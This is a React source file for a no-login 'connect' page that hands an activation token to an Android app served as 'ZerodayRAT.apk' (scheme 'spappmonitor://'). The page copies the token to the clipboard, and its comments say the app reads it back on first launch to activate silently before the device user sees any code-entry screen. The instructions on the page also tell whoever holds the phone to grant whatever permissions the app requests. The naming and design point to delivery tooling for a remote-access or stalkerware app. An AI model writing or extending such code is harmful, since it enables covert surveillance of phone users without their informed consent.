import { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";

/** Where the admin uploads the latest built APK — see dashboard/public/download/README.md. */
const APK_DOWNLOAD_PATH = "/download/ZerodayRAT.apk";

/**
 * Public (no-login) landing page the dashboard's device-activation QR code /
 * shareable link points to: https://<domain>/connect?token=...&name=...
 *
 * If the app is already installed, Android intercepts this https URL via the
 * intent-filter on ActivationActivity (see AndroidManifest.xml) and opens
 * straight into the app with the token pre-filled. If it's not installed
 * yet, "Download App" below copies the token to the clipboard first — a
 * sideloaded app has no Play Install Referrer to carry the token across the
 * install/open gap, so SplashActivity reads it back from the clipboard on
 * first launch instead (see SplashActivity.kt) and activates silently
 * before the device user ever sees a code-entry screen.
 */
export default function ConnectPage() {
  const [params] = useSearchParams();
  const token = params.get("token") || "";
  const name = params.get("name") || "this device";
  const [copied, setCopied] = useState(false);
  const [downloadStarted, setDownloadStarted] = useState(false);

  // One explicit, user-initiated attempt to hand off to the app via the
  // custom scheme. Browsers block navigating to non-http(s) schemes when
  // typed/pasted into the address bar, but a script-triggered redirect from
  // a page the user navigated to (by tapping the link/QR) is allowed.
  useEffect(() => {
    if (!token) return;
    const appUrl = `spappmonitor://activate?token=${encodeURIComponent(token)}&name=${encodeURIComponent(name)}`;
    window.location.href = appUrl;
  }, [token, name]);

  async function handleCopyToken() {
    try {
      await navigator.clipboard.writeText(token);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      // clipboard API unavailable — token text is still visible to copy manually
    }
  }

  async function handleDownloadApp() {
    try {
      await navigator.clipboard.writeText(token);
    } catch {
      // clipboard API unavailable — SplashActivity's clipboard check will just
      // find nothing and fall back to the manual code-entry screen.
    }
    setDownloadStarted(true);
    window.location.href = APK_DOWNLOAD_PATH;
  }

  if (!token) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50 px-4">
        <p className="text-gray-500 text-sm">Invalid or missing activation link.</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 px-4">
      <div className="max-w-sm w-full bg-white rounded-lg shadow-sm p-6 text-center">
        <h1 className="text-lg font-bold text-primary-dark mb-1">Connecting: {name}</h1>
        <p className="text-gray-500 text-sm mb-4">
          If the app is already installed on this phone, it should open automatically.
        </p>

        <button
          onClick={handleDownloadApp}
          className="w-full bg-primary text-white text-sm font-medium px-4 py-2.5 rounded hover:bg-primary-dark transition mb-3"
        >
          Download App
        </button>

        {downloadStarted && (
          <p className="text-xs text-gray-500 mb-4">
            Downloading... once installed, open the app, tap Allow, and it will connect as "
            {name}" automatically — no code to type.
          </p>
        )}

        <div className="text-left bg-gray-50 border rounded p-3 text-sm mb-4">
          <p className="font-medium mb-2">Steps:</p>
          <ol className="list-decimal list-inside text-gray-600 space-y-1">
            <li>Tap "Download App" above and install it.</li>
            <li>Open the app and tap "Allow".</li>
            <li>Grant the permissions it asks for.</li>
          </ol>
        </div>

        <details className="text-xs text-gray-500">
          <summary className="cursor-pointer select-none">Or enter the activation code manually</summary>
          <div className="flex gap-2 mt-2">
            <code className="flex-1 block bg-gray-50 border rounded px-2 py-1.5 font-mono break-all text-left">
              {token}
            </code>
            <button
              onClick={handleCopyToken}
              className="text-xs bg-white border border-gray-300 rounded px-2 py-1.5 hover:bg-gray-50 shrink-0"
            >
              {copied ? "Copied!" : "Copy"}
            </button>
          </div>
        </details>
      </div>
    </div>
  );
}
